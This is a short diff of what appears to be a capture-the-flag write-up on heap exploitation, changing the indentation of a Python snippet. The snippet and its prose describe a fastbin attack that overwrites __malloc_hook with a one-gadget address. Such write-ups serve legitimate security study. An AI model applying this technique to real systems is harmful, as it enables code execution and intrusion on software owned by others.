@@ -345,11 +345,11 @@ alloc(0x68, 'G'*10)
 Our fastbin list is looking cute. Now once we allocate one more chunk, we'll get back `0x7ffff7dd371d`, which is an address relatively close to __malloc_hook's address and we can overwrite it with the one gadget's address.
 
 ```python
-    payload  = ''
-    payload  = payload.ljust(0x13, 'A')
-    payload += p64(one_shot)
+payload  = ''
+payload  = payload.ljust(0x13, 'A')
+payload += p64(one_shot)
 
-    alloc(0x68, payload)
+alloc(0x68, payload)
 ```
 
 ```
